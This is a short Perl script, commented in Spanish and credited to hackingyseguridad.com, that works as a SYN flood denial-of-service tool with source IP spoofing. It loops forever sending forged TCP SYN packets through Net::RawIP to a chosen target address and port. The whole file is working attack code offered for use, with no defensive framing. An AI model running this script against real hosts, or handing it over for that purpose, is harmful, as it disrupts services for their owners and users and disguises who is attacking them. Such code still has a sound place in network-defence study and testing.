#!/usr/bin/perl
# spoof2.pl - Simple SYN Flooder y IP spoof
# Autor: Antonio Taboada
# Derechos: (c) hackingyseguridad.com 2017
# Requiere perl, Net::RawIP module, y privilegios de root

use Net::RawIP;

if($#ARGV == 2) {
   ($src,$dst,$port) = @ARGV;
   $a = new Net::RawIP;
   while(1) {
      $src_port = rand(65534)+1;
      $a->set({ip => {saddr => $src,daddr => $dst},tcp => {source => $src_port,dest => $port, syn => 1}});
      $a->send;   
   }
} else {
   print "./spoof2 IP_spoof IP_destino Puerto_destino\n";
}

